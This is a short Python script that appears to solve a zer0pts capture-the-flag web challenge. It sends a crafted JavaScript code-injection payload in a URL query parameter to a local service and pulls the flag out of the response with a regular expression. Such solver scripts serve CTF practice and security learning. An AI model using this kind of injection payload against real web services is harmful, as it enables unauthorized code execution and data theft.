import os
import requests
import re

HOST = os.getenv('HOST', 'localhost')
PORT = os.getenv('PORT', '8002')

URL = 'http://{}:{}/'.format(HOST, PORT)

r = requests.get(URL + '?code=b=>[...arguments[0]%2b0]})(a=>{')

print(re.findall(r'zer0pts\{.+?\}', r.text.replace(',', ''))[0])
